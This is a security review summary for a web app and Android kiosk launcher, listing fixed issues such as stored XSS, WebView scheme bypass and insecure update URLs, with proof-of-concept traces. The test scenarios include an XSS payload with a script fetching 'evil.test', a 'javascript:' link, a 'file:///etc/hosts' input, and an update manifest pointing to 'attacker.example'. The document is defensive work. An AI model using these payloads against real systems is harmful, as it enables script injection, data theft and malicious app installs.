# Security Summary

**Reviewed Files**: 48
**Issues Resolved**: 16

### Issues Resolved

| Area | File | Line | What Was Happening | Impact | Status | How It Was Fixed |
|---|---|---|---|---|---|---|
| Secrets & Environment Hygiene | `.gitignore` | 35 | Local `.env` and `.env.*` files were not explicitly ignored, risking accidental secret commits. | Medium | Fixed | Added `.env` and `.env.*` (while keeping `!.env.example`) to `.gitignore`. |
| Unsanitized HTML / XSS | `src/components/RichNotesEditor.tsx` | 118, 126, 138 | Rich note HTML loaded into `contentEditable` and inserted via `insertHtmlAtCursor` was written without tag/attribute filtering, allowing stored `<script>` or inline event handler payloads to execute. | High | Fixed | Filtered all rich note HTML through `sanitizeRichHtml()` in `src/utils/validation.ts` before DOM assignment, sync, and insertion, and escaped plain-text templates with `escapeHtml()`. |
| Unsanitized HTML / XSS | `src/utils/selfImprovementEngine.ts` | 317, 561, 564 | Note titles, note HTML bodies, and `whyIStarted` text accepted unvalidated strings and raw HTML. | High | Fixed | Applied `sanitizeRichHtml()` to note bodies and `stripControlChars()` with length limits to titles and reflection text. |
| Unsanitized HTML / XSS | `src/components/SelfImprovementWorkspace.tsx` | 233 | Sending a goal plan into Rich Notes interpolated `goal.title`, `whyItMatters`, `targetDate`, and milestone titles directly into raw HTML strings. | Medium | Fixed | Escaped every interpolated field with `escapeHtml()` before generating note HTML. |
| Unsanitized HTML / XSS | `src/components/AndroidDeviceSimulator.tsx` | 236, 497 | Quick Diary submissions and browser bar inputs accepted unvalidated text and interpolated diary text directly into HTML paragraphs. | Medium | Fixed | Validated Quick Diary entries with `quickDiaryFormSchema`, escaped text with `escapeHtml()`, and enforced `browserUrlSchema` before navigation. |
| API Payload Validation & Rate Limiting | `server.ts` | 94, 103, 203 | `POST /api/notes/daily-prompt` accepted arbitrary JSON payloads without schema bounds or request rate limits, lacked prompt context delimiters, and passed raw SDK errors back to callers. | High | Fixed | Added a 20 req/60s sliding-window IP rate limiter, validated requests and AI outputs with `dailyPromptRequestSchema` and `dailyPromptResponseSchema`, wrapped user context inside `<context_data>` tags, sanitized error responses, added security response headers, and set `dotfiles: 'deny'` on static mounts. |
| Access Control & Account Verification | `src/App.tsx` | 478, 679 | Cloud sync listeners, initial document bootstrap, and remote admin updates only checked for a signed-in user object without verifying `user.emailVerified`. | Medium | Fixed | Enforced `user.emailVerified` checks before syncing device/growth state, attaching Firestore listeners, or pushing remote PC updates. |
| Database Security Rules | `firestore.rules` | 34, 49, 233 | Bounded string-list checks only validated `arr[0]`, and `notes` / array-of-map fields in growth documents did not validate tail elements or note field bounds (`id`, `title`, `htmlContent`). | Medium | Needs Follow-Up | Updated `isStringListBounded()` to validate both first and last items, added `isMapListBounded()` and `isValidNotesList()` / `isValidNoteEntry()`, and updated `firestore.rules.test.ts`; automatic rule deployment failed with a project permission error, so deploy `firestore.rules` manually to your Firebase project. |
| Untrusted Storage Hydration | `src/App.tsx` | 197, 212 | Data loaded from `localStorage` was trusted with only shallow object spreads, letting malformed or injected fields enter app state. | Medium | Fixed | Replaced shallow merges with `parseStoredKioskPayload()` and `parseSelfImprovementPayload()` powered by Zod schemas in `src/utils/validation.ts`. |
| Sync Payload Sanitization | `src/utils/cloudSyncEngine.ts` | 277, 304 | Remote Firestore snapshots and outgoing growth payloads skipped schema validation and HTML sanitization when merged into local state. | Medium | Fixed | Validated and sanitized both outgoing sync payloads and incoming remote snapshots through `parseSelfImprovementPayload()`, `parseStoredKioskPayload()`, and `sanitizeRichHtml()`. |
| Weak Random Salt Fallback | `src/utils/cloudSyncEngine.ts` | 95 | `generatePinSalt()` fell back to `Math.random()` when Web Crypto was unavailable, weakening passcode salt unpredictability. | Medium | Fixed | Removed the `Math.random()` fallback and required `crypto.getRandomValues()`. |
| Dangerous URI Schemes | `src/utils/kioskEngine.ts` | 669 | `isUrlAllowedInKioskBrowser()` relied only on hostname parsing, leaving `javascript:`, `data:`, and `file:` inputs insufficiently screened at scheme level. | Medium | Fixed | Enforced an explicit `http:` / `https:` URI scheme guard before domain and keyword filtering. |
| Android WebView Hardening | `android-kiosk-launcher/app/src/main/kotlin/com/kiosk/launcher/ui/KioskBrowserActivity.kt` | 52, 105, 114 | `KioskBrowserActivity` did not explicitly disable legacy `file://` cross-origin access or mixed HTTP content, and allowed URLs with embedded `userInfo` (`user@host`) or non-HTTP schemes from the address bar. | High | Fixed | Disabled `allowFileAccessFromFileURLs`, `allowUniversalAccessFromFileURLs`, and mixed content (`MIXED_CONTENT_NEVER_ALLOW`), enabled Safe Browsing on Android O+, and blocked non-`http`/`https` schemes and `uri.userInfo` in both `navigateFromBar()` and `decide()`. |
| Insecure Update Manifest URLs | `android-kiosk-launcher/app/src/main/kotlin/com/kiosk/launcher/update/UpdateManifest.kt` | 50 | Relative or mixed-scheme `apkUrl` values in `latest.json` were not strictly blocked before resolution against `feedUrl`. | Medium | Fixed | Explicitly rejected `http://` `apkUrl` values and required both the manifest feed origin and final resolved APK URL to use `https://`. |
| Sensitive Log Exposure | `src/firebase.ts`, `src/components/ErrorBoundary.tsx` | 45, 57 / 25 | Error logging recorded user email/tenant details in `FirestoreErrorInfo` and logged full error stacks in `componentDidCatch`. | Low | Fixed | Removed email and tenant PII from `FirestoreErrorInfo` and `console.error`, and restricted `ErrorBoundary` logging to `error.name`. |
| Unvalidated Form Submissions | `src/components/SelfImprovementWorkspace.tsx`, `src/components/PcRemoteWorkspace.tsx`, `src/components/AndroidDeviceSimulator.tsx` | Multiple | Forms for habits, tasks, goals, milestones, custom Android package names, kiosk titles, quiet hours, and PIN updates accepted raw strings/numbers without strict schema checks. | Low | Fixed | Enforced dedicated Zod schemas (`habitFormSchema`, `taskFormSchema`, `goalFormSchema`, `milestoneFormSchema`, `customAppFormSchema`, `kioskTitleSchema`, `downtimeHoursSchema`, `adminPinValueSchema`) with clear error feedback. |

### Safeguards Verified

| Area | File | How It's Protected |
|---|---|---|
| Server-Side AI Secret | `server.ts` | Reads `GEMINI_API_KEY` solely from `process.env`; never ships the key to the React client bundle. |
| Passcode Hashing | `src/utils/cloudSyncEngine.ts`, `android-kiosk-launcher/app/src/main/kotlin/com/kiosk/launcher/data/PinHash.kt` | Hashes admin passcodes with SHA-256 and a random 16-byte salt; plain passcodes are never synced to Firestore. |
| Firebase Client Config | `firebase-applet-config.json` | Contains only public Firebase Web App identifiers and client config; access control is enforced by Authentication and `firestore.rules`. |
| Owner Isolation & Immutable Fields | `firestore.rules` | Restricts reads/writes under `/users/{userId}` to matching `request.auth.uid` with verified email, validates field keys/types, and prevents client tampering of `ownerId`, `deviceId`, or `createdAt`. |
| Signed APK OTA Integrity | `android-kiosk-launcher/app/src/main/kotlin/com/kiosk/launcher/update/UpdateDownloader.kt`, `scripts/apk-meta.mjs` | Verifies downloaded APK byte size and SHA-256 digest against the manifest before Android package installation. |

---

## PoC Verification

### Stored XSS via Rich Notes Editor & Local/Cloud Hydration

#### Summary
| Field | Value |
|---|---|
| Issue Type | Unsanitized HTML Rendering (Stored XSS) |
| Impact | High |
| Affected File | `src/components/RichNotesEditor.tsx:118`, `src/utils/validation.ts:91` |
| Test Scenario | `<p>Journal</p><img src=x onerror="alert(1)"><script>fetch('https://evil.test')</script><a href="javascript:alert(2)" onclick="steal()">Link</a>` |

#### How It Was Fixed
All rich note content passes through `sanitizeRichHtml()` before entering `contentEditable`, updating React state, saving to `localStorage`, or syncing with Firestore. Executable tags (`<script>`, `<img>`, `<iframe>`, `<svg>`), inline `on*` event handlers, and non-`http(s)` `href` values are stripped, leaving only safe formatting markup.

#### Step-by-Step Trace
| Step | What Happens in the Code | Outcome |
|---|---|---|
| 1 | Malicious HTML arrives via `activeNote.htmlContent`, `localStorage`, or remote Firestore sync | Payload enters `RichNotesEditor.tsx:118` or `parseSelfImprovementPayload()` (`validation.ts:293`) |
| 2 | `sanitizeRichHtml()` strips `<script>` blocks, removes `<img>` via `DANGEROUS_SINGLE_TAG_RE`, strips `onclick`, and validates `href` in `extractSafeHref()` (`validation.ts:71`) | Unsafe tags, attributes, and `javascript:` URI are discarded |
| 3 | Resulting DOM string becomes `<p>Journal</p><a>Link</a>` before `innerHTML` assignment | **Handled Safely** |

#### Conclusion
**Fix Verified** - Executable scripts, image event handlers, and `javascript:` links are stripped before any HTML reaches the DOM or persisted note state.

---

### Unvalidated Payload & Prompt Context Injection on AI Daily Prompt Endpoint

#### Summary
| Field | Value |
|---|---|
| Issue Type | Missing API Schema Validation & Rate Limiting |
| Impact | High |
| Affected File | `server.ts:94-228`, `src/utils/validation.ts:138-162` |
| Test Scenario | `POST /api/notes/daily-prompt` with `cleanStreakDays: -50`, 50 goals, control characters in `whyIStarted`, or >20 requests/min from one IP |

#### How It Was Fixed
Incoming bodies are capped at 256 KB, throttled to 20 requests per 60 seconds per client IP, validated against `dailyPromptRequestSchema`, fenced inside `<context_data>...</context_data>` tags with system instructions treating them strictly as user data, and verified with `dailyPromptResponseSchema` before returning to the client.

#### Step-by-Step Trace
| Step | What Happens in the Code | Outcome |
|---|---|---|
| 1 | Oversized, malformed, or rapid burst `POST /api/notes/daily-prompt` requests arrive at `server.ts:94` | Enters endpoint handler |
| 2 | `isRateLimited()` (`server.ts:95`) rejects >20 req/min with HTTP `429`; `dailyPromptRequestSchema.safeParse()` (`server.ts:103`) rejects out-of-range numbers or >6 goals with HTTP `400` | Invalid/abusive requests blocked before any Gemini SDK call |
| 3 | Validated fields have control characters stripped (`stripControlChars`) and are wrapped inside `<context_data>` (`server.ts:146`); model output must pass `dailyPromptResponseSchema` (`server.ts:203`) | **Handled Safely** |

#### Conclusion
**Fix Verified** - Malformed payloads, prompt-flood bursts, and unvalidated upstream responses are rejected before reaching the AI client or returning to the browser.

---

### WebView Scheme Bypass & Spoofed Host in Android Kiosk Browser

#### Summary
| Field | Value |
|---|---|
| Issue Type | Unsafe URI Scheme & WebView File Access |
| Impact | High |
| Affected File | `android-kiosk-launcher/app/src/main/kotlin/com/kiosk/launcher/ui/KioskBrowserActivity.kt:47-130` |
| Test Scenario | Entering `file:///etc/hosts`, `javascript:alert(1)`, or `https://evil.test@khanacademy.org` in the kiosk browser bar |

#### How It Was Fixed
Legacy WebView file URL access and mixed content are disabled at initialization, and both `navigateFromBar()` and `WebViewClient.shouldOverrideUrlLoading()` route every URL through `decide()`, which permits only `http`/`https` schemes and rejects any URI containing `userInfo`.

#### Step-by-Step Trace
| Step | What Happens in the Code | Outcome |
|---|---|---|
| 1 | User or page triggers navigation to `file:///etc/hosts` or `https://evil.test@khanacademy.org` | Enters `navigateFromBar()` (`line 102`) or `shouldOverrideUrlLoading` (`line 63`) |
| 2 | `decide(uri)` checks `scheme != "http" && scheme != "https"` (`line 116`) and `!uri.userInfo.isNullOrEmpty()` (`line 123`) | Both payloads immediately match and call `showBlocked()`, returning `true` to cancel loading |
| 3 | `WebSettings` also enforces `allowFileAccessFromFileURLs = false` and `MIXED_CONTENT_NEVER_ALLOW` (`lines 52-56`) | **Handled Safely** |

#### Conclusion
**Fix Verified** - Non-HTTP schemes and credential-spoofed URLs cannot load in `KioskBrowserActivity`.

---

### Unverified Account Cloud Sync & Downgrade APK Feed Checks

#### Summary
| Field | Value |
|---|---|
| Issue Type | Missing Verification Guard & Cleartext Update URL |
| Impact | Medium |
| Affected File | `src/App.tsx:478,679` & `android-kiosk-launcher/app/src/main/kotlin/com/kiosk/launcher/update/UpdateManifest.kt:50` |
| Test Scenario | Syncing with an account whose `emailVerified === false`, or supplying `{"apkUrl": "http://attacker.example/app.apk", ...}` in an update manifest |

#### How It Was Fixed
Client cloud sync listeners and remote updates require `user.emailVerified` alongside Firestore owner rules, while `UpdateManifest.resolveApkUrl()` explicitly rejects `http://` URLs and requires `https://` on both the feed origin and resolved APK URL.

#### Step-by-Step Trace
| Step | What Happens in the Code | Outcome |
|---|---|---|
| 1 | Unverified auth session attempts sync in `src/App.tsx:478` or remote update at `src/App.tsx:679`; or `UpdateManifest.parse()` receives an `http://` `apkUrl` | Enters client guard / manifest parser |
| 2 | `if (!user.emailVerified)` returns early without creating listeners or updating Firestore (`App.tsx:478,679`); `resolveApkUrl()` returns `""` on `http://` (`UpdateManifest.kt:52`) | Sync aborted / `UpdateManifest.parse()` returns `null` |
| 3 | Local offline workspace stays active; Android updater treats invalid feed as "no update" | **Handled Safely** |

#### Conclusion
**Fix Verified** - Unverified sessions cannot run cloud sync mutations and cleartext APK URLs cannot be accepted by the updater.
